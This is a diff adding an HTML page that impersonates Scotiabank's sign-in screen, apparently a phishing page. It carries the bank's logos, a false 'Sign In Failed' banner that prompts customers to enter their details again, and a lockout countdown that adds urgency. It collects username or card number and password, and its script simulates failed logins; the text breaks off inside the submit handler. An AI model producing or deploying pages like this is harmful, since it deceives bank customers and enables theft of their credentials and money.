@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Sign In Issue | Scotiabank</title>
+    <style>
+      .loading {
+        display: none;
+      }
+      .loading.active {
+        display: inline-block;
+        animation: spin 1s linear infinite;
+      }
+      @keyframes spin {
+        from { transform: rotate(0deg); }
+        to { transform: rotate(360deg); }
+      }
+      .error-message {
+        display: none;
+        color: #EB121A;
+        font-size: 14px;
+        margin-top: 5px;
+      }
+      .error-message.show {
+        display: block;
+      }
+      .success-message {
+        display: none;
+        color: #02a95c;
+        font-size: 14px;
+        margin-top: 5px;
+      }
+      .success-message.show {
+        display: block;
+      }
+      .alert-box {
+        display: flex;
+        align-items: flex-start;
+        gap: 12px;
+        padding: 16px;
+        background-color: #FFF2F2;
+        border: 2px solid #EB121A;
+        border-radius: 8px;
+        margin-bottom: 24px;
+      }
+      .alert-icon {
+        color: #EB121A;
+        flex-shrink: 0;
+      }
+      .alert-content {
+        flex: 1;
+      }
+      .alert-title {
+        font-weight: 600;
+        color: #EB121A;
+        margin-bottom: 4px;
+      }
+      .alert-description {
+        color: #666;
+        font-size: 14px;
+        line-height: 1.5;
+      }
+      .lockout-warning {
+        display: none;
+        background-color: #FFF8E6;
+        border: 2px solid #F59E0B;
+        border-radius: 8px;
+        padding: 16px;
+        margin-top: 20px;
+      }
+      .lockout-warning.show {
+        display: block;
+      }
+      .attempt-counter {
+        font-weight: 600;
+        color: #EB121A;
+      }
+      .security-tips {
+        background-color: #F6F7FC;
+        border-radius: 8px;
+        padding: 20px;
+        margin-top: 30px;
+      }
+      .security-tip {
+        display: flex;
+        align-items: flex-start;
+        gap: 12px;
+        margin-bottom: 12px;
+      }
+      .security-tip:last-child {
+        margin-bottom: 0;
+      }
+      .tip-icon {
+        color: #007EAB;
+        flex-shrink: 0;
+      }
+    </style>
+  </head>
+  <body class="min-h-screen flex flex-col bg-[#F6F7FC]">
+    <div
+      class="md:p-[20px] flex-1 flex flex-col md:justify-center items-center h-screen bg-[#FAFBFD]"
+    >
+      <div
+        class="md:w-[600px] w-full md:mt-[60px] bg-[white] rounded-[8px] shadow-md md:p-[40px] p-[30px] flex flex-col items-center"
+      >
+        <div class="w-full flex items-end">
+          <i data-lucide="alert-triangle" class="text-[#EB121A] ml-auto"></i>
+        </div>
+        
+        <!-- Error Alert Box -->
+        <div class="alert-box w-full">
+          <div class="alert-icon">
+            <i data-lucide="alert-circle" class="w-6 h-6"></i>
+          </div>
+          <div class="alert-content">
+            <div class="alert-title">Sign In Failed</div>
+            <div class="alert-description">
+              The username or password you entered is incorrect. Please try again. 
+              If you've forgotten your login details, you can reset them using the links below.
+            </div>
+          </div>
+        </div>
+
+        <div>
+          <h1
+            class="mt-4 text-[1.6rem] leading-[3.5rem] font-[600] tracking-[-0.025rem] text-[rgb(51,51,51)]"
+            style="font-family: 'Scotia Headline', Arial, Helvetica, sans-serif"
+          >
+            Sign In
+          </h1>
+        </div>
+        <img
+          src="data:image/png;base64,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"
+          alt="Logo"
+          class="h-[40px]"
+        />
+
+        <form id="loginForm" class="w-[350px] mt-[50px]">
+          <div class="mb-8">
+            <label class="block md:text-[18px] text-[14px] font-semibold text-[#1d1d1d]"
+              >Username or card number</label
+            >
+            <div
+              class="flex items-center gap-3 border-b-2 border-[#EB121A] py-2 focus-within:border-[#007EAB]"
+            >
+              <i data-lucide="user" class="text-gray-700"></i>
+              <input
+                id="usernameInput"
+                name="login"
+                type="text"
+                class="border-none w-full mb-2 outline-none focus:ring-0 placeholder:text-[#8a8a8a] bg-transparent text-[#1d1d1d] text-[22px]"
+                placeholder="Enter username or card number"
+                required
+              />
+            </div>
+            <div id="usernameError" class="error-message"></div>
+          </div>
+
+          <div class="mb-8">
+            <label class="block md:text-[18px] text-[14px] font-semibold text-[#1d1d1d]"
+              >Password</label
+            >
+            <div
+              class="flex items-center gap-3 border-b-2 border-[#EB121A] py-2 focus-within:border-[#007EAB]"
+            >
+              <i data-lucide="lock-keyhole" class="text-gray-700"></i>
+              <input
+                id="passwordInput"
+                name="password"
+                type="password"
+                class="border-none w-full mb-2 outline-none focus:ring-0 placeholder:text-[#8a8a8a] bg-transparent text-[#1d1d1d] text-[22px]"
+                placeholder="Enter password"
+                required
+              />
+            </div>
+            <div id="passwordError" class="error-message"></div>
+            <div id="successMessage" class="success-message"></div>
+          </div>
+
+          <!-- Lockout Warning (Shows after multiple attempts) -->
+          <div id="lockoutWarning" class="lockout-warning">
+            <div class="flex items-start gap-2">
+              <i data-lucide="alert-triangle" class="text-[#F59E0B] w-5 h-5 mt-0.5"></i>
+              <div>
+                <p class="text-[#F59E0B] font-[600] text-sm mb-1">Multiple Failed Attempts</p>
+                <p class="text-[#666] text-sm">
+                  You have <span id="attemptCount" class="attempt-counter">2</span> remaining attempts 
+                  before your account is temporarily locked for security reasons.
+                </p>
+              </div>
+            </div>
+          </div>
+
+          <label
+            class="flex items-center gap-3 text-[18px] text-[#1d1d1d] cursor-pointer mt-6"
+          >
+            <input type="checkbox" class="hidden peer" />
+
+            <span
+              class="w-[26px] h-[26px] rounded-md border-2 border-[#7a7a7a] flex items-center justify-center peer-checked:bg-[#02a95c] peer-checked:border-[#02a95c]"
+            >
+              <svg
+                class="w-4 h-4 text-white opacity-0 peer-checked:opacity-100"
+                viewBox="0 0 24 24"
+                fill="currentColor"
+              >
+                <path d="M20.3 5.7l-11 11-5-5 1.4-1.4 3.6 3.6 9.6-9.6z" />
+              </svg>
+            </span>
+
+            <span class="text-[16px] font-[300]"
+              >Remember my username or card number</span>
+          </label>
+          <div class="w-full flex justify-center">
+            <button
+              id="submitBtn"
+              type="submit"
+              class="mt-[50px] w-[300px] bg-[#EB121A] px-[20px] py-[15px] rounded-[8px] flex items-center justify-center gap-2 hover:bg-[#d10f17] transition-colors"
+            >
+              <svg class="loading w-5 h-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+              </svg>
+              <span class="text-[white] text-[13px]">Sign in</span>
+            </button>
+          </div>
+
+          <!-- Security Tips -->
+          <div class="security-tips w-full mt-8">
+            <h3 class="text-[16px] font-[600] text-[#1d1d1d] mb-4">Security Tips:</h3>
+            <div class="security-tip">
+              <i data-lucide="shield-check" class="tip-icon w-5 h-5"></i>
+              <span class="text-[14px] text-[#666]">Ensure your username and password are entered correctly, paying attention to case sensitivity.</span>
+            </div>
+            <div class="security-tip">
+              <i data-lucide="shield-check" class="tip-icon w-5 h-5"></i>
+              <span class="text-[14px] text-[#666]">If you've forgotten your credentials, use the "Reset Password" or "Forgot Username" links below.</span>
+            </div>
+            <div class="security-tip">
+              <i data-lucide="shield-check" class="tip-icon w-5 h-5"></i>
+              <span class="text-[14px] text-[#666]">Never share your login credentials with anyone. Scotiabank will never ask for your password via email or phone.</span>
+            </div>
+          </div>
+
+          <!-- Help Links -->
+          <div class="w-full mt-8 space-y-4">
+            <a href="#" class="w-full flex justify-center items-center">
+              <span class="text-[#03749D] text-[16px] font-[700]"
+                >Forgot your username?
+              </span>
+              <i data-lucide="chevron-right" class="text-[#03749D] w-5 h-5"></i>
+            </a>
+            
+            <a href="#" class="w-full flex justify-center items-center">
+              <span class="text-[#03749D] text-[16px] font-[700]"
+                >Reset your password
+              </span>
+              <i data-lucide="chevron-right" class="text-[#03749D] w-5 h-5"></i>
+            </a>
+
+            <a href="#" class="w-full flex justify-center items-center">
+              <span class="text-[#03749D] text-[16px] font-[700]"
+                >Need help signing in?
+              </span>
+              <i data-lucide="chevron-right" class="text-[#03749D] w-5 h-5"></i>
+            </a>
+          </div>
+        </form>
+      </div>
+
+      <div class="md:flex block gap-[8px] mt-[50px] mb-[70px]">
+        <span>Don't have a username and password?</span>
+        <br class="md:hidden"/>
+        <a href="#" class="font-[600] text-[16px]">Set them up now.</a>
+      </div>
+    </div>
+
+    <footer class="pt-6 pb-3 text-sm text-gray-600 bg-[white] shadow-md border border-1 hidden md:block">
+      <div class="flex justify-between mb-4 py-[10px] px-[50px]">
+        <div>
+            <img class="h-9 w-13" src="data:image/png;base64,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" alt="">
+        </div>
+        <div class="flex gap-[20px] font-[300] flex-wrap">
+          <a href="#">Contact Us</a>
+          <a href="#">Security</a>
+          <a href="#">Legal</a>
+          <a href="#">Privacy</a>
+          <a href="#">Accessibility</a>
+          <a href="#">Cookie Settings</a>
+        </div>
+      </div>
+
+      <hr class="mt-4 mb-3" />
+
+      <div class="flex justify-end px-[20px]">
+        <span class="text-[12px]">© Scotiabank. All Rights Reserved.</span>
+      </div>
+    </footer>
+
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+    <script>
+      // Initialize Lucide icons
+      lucide.createIcons();
+      
+      // Track login attempts
+      let loginAttempts = 0;
+      const MAX_ATTEMPTS = 3;
+      
+      // Load attempt count from localStorage or initialize
+      function loadAttemptCount() {
+        const savedAttempts = localStorage.getItem('login_attempts');
+        if (savedAttempts) {
+          loginAttempts = parseInt(savedAttempts);
+          updateLockoutWarning();
+        }
+      }
+      
+      // Save attempt count to localStorage
+      function saveAttemptCount() {
+        localStorage.setItem('login_attempts', loginAttempts.toString());
+      }
+      
+      // Update lockout warning display
+      function updateLockoutWarning() {
+        const lockoutWarning = document.getElementById('lockoutWarning');
+        const attemptCount = document.getElementById('attemptCount');
+        const remainingAttempts = MAX_ATTEMPTS - loginAttempts;
+        
+        if (loginAttempts >= 1 && loginAttempts < MAX_ATTEMPTS) {
+          lockoutWarning.classList.add('show');
+          attemptCount.textContent = remainingAttempts;
+          
+          // Update border colors based on attempt count
+          if (loginAttempts >= 2) {
+            document.querySelectorAll('.input-icon').forEach(el => {
+              el.style.borderBottomColor = '#EB121A';
+            });
+          }
+        } else if (loginAttempts >= MAX_ATTEMPTS) {
+          // Account locked scenario
+          showAccountLocked();
+        } else {
+          lockoutWarning.classList.remove('show');
+        }
+      }
+      
+      // Show account locked message
+      function showAccountLocked() {
+        const alertBox = document.querySelector('.alert-box');
+        alertBox.innerHTML = `
+          <div class="alert-icon">
+            <i data-lucide="lock" class="w-6 h-6"></i>
+          </div>
+          <div class="alert-content">
+            <div class="alert-title">Account Temporarily Locked</div>
+            <div class="alert-description">
+              For security reasons, your account has been temporarily locked due to multiple failed login attempts. 
+              Please try again in 30 minutes or contact customer support for immediate assistance.
+            </div>
+          </div>
+        `;
+        
+        // Update lockout warning to show locked status
+        const lockoutWarning = document.getElementById('lockoutWarning');
+        lockoutWarning.innerHTML = `
+          <div class="flex items-start gap-2">
+            <i data-lucide="alert-octagon" class="text-[#DC2626] w-5 h-5 mt-0.5"></i>
+            <div>
+              <p class="text-[#DC2626] font-[600] text-sm mb-1">Account Locked</p>
+              <p class="text-[#666] text-sm">
+                Your account is temporarily locked. You can try again in 30 minutes or 
+                <a href="#" class="text-[#03749D] font-[600]">contact support</a> for immediate assistance.
+              </p>
+            </div>
+          </div>
+        `;
+        lockoutWarning.classList.add('show');
+        lockoutWarning.style.backgroundColor = '#FEF2F2';
+        lockoutWarning.style.borderColor = '#DC2626';
+        
+        // Disable form
+        document.getElementById('loginForm').querySelectorAll('input, button').forEach(el => {
+          el.disabled = true;
+        });
+        
+        document.getElementById('submitBtn').innerHTML = `
+          <i data-lucide="lock" class="w-5 h-5 text-white"></i>
+          <span class="text-[white] text-[13px]">Account Locked</span>
+        `;
+        document.getElementById('submitBtn').style.backgroundColor = '#9CA3AF';
+        document.getElementById('submitBtn').style.cursor = 'not-allowed';
+        
+        lucide.createIcons();
+        
+        // Set timeout to unlock after 30 minutes (for demo, using 5 seconds)
+        setTimeout(() => {
+          resetLoginAttempts();
+        }, 1800000); // 30 minutes in milliseconds
+      }
+      
+      // Reset login attempts
+      function resetLoginAttempts() {
+        loginAttempts = 0;
+        localStorage.removeItem('login_attempts');
+        location.reload(); // Refresh page to reset UI
+      }
+      
+      // Simulate incorrect login
+      function simulateFailedLogin() {
+        loginAttempts++;
+        saveAttemptCount();
+        updateLockoutWarning();
+        
+        // Show specific error message
+        const passwordError = document.getElementById('passwordError');
+        passwordError.textContent = 'Incorrect username or password. Please try again.';
+        passwordError.classList.add('show');
+        
+        // Highlight input fields
+        document.getElementById('usernameInput').classList.add('error');
+        document.getElementById('passwordInput').classList.add('error');
+        
+        // Clear password field for security
+        document.getElementById('passwordInput').value = '';
+        
+        // Shake animation for error effect
+        const form = document.getElementById('loginForm');
+        form.style.animation = 'none';
+        setTimeout(() => {
+          form.style.animation = 'shake 0.5s ease-in-out';
+        }, 10);
+        
+        // Add shake animation
+        const style = document.createElement('style');
+        style.textContent = `
+          @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+          }
+        `;
+        document.head.appendChild(style);
+        
+        // Focus on password field
+        document.getElementById('passwordInput').focus();
+      }
+      
+      // Clear errors when user starts typing
+      document.getElementById('usernameInput').addEventListener('input', function() {
+        this.classList.remove('error');
+        document.getElementById('passwordError').classList.remove('show');
+      });
+      
+      document.getElementById('passwordInput').addEventListener('input', function() {
+        this.classList.remove('error');
+        document.getElementById('passwordError').classList.remove('show');
+      });
+      
+      // Form submission
+      document.getElementById('loginForm').addEventListener('submit', function (e) {
+        e.preventDefault();
+        
+        const loginId = document.getElementById('usernameInput').value;
+        const password = document.getElementById('passwordInput').value;
+        
+        // Show loading state
+        const submitBtn = document.getElementById('submitBtn');
+        const spinner = submitBtn.querySelector('.loading');
+        const buttonText = submitBtn.querySelector('span');
+        
+        spinner.classList.add('active');
+        buttonText.textContent = 'Signing in...';
+        submitBtn.disabled = true;
+        
+        // Clear any previous error/success messages
